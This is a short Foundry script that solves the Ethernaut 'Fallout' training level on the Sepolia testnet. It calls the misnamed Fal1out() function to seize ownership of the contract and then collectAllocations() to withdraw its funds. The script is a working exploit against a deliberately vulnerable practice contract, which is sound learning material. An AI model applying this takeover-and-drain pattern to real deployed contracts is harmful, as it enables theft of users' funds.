// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IFallout {
    function Fal1out() external;
    function collectAllocations() external;
}
//forge script  --rpc-url sepolia --account metamask  script/Cracked2_Fallout.s.sol --broadcast
contract Cracked2_FalloutScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Fallout_address"));
    }

    function run() public {
        vm.startBroadcast();
        IFallout(ethernaut_contracts).Fal1out();
        IFallout(ethernaut_contracts).collectAllocations();
        vm.stopBroadcast();
    }
}
